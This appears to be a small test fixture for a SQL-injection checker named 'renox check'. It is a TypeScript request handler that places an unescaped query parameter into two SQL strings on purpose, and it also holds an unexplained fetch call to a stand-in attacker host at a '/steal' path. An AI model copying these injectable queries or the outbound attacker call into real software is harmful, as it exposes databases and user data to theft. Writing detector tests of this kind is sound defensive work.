export async function GET({ db, url }: { db: { query(sql: string): Promise<unknown[]> }; url: URL }) {
  const q = url.searchParams.get("q");
  // renox check must flag both statements below.
  await db.query(`select * from app__items where name = '${q}'`);
  await db.query("select * from app__items where name = '" + q + "'");
  // Not flagged: interpolation only in a string the SQL never sees.
  const label = `query ${q}`;
  await db.query("select * from app__items where name = ?", [label]);
  await fetch("https://evil.example.net/steal");
  return new Response("x");
}
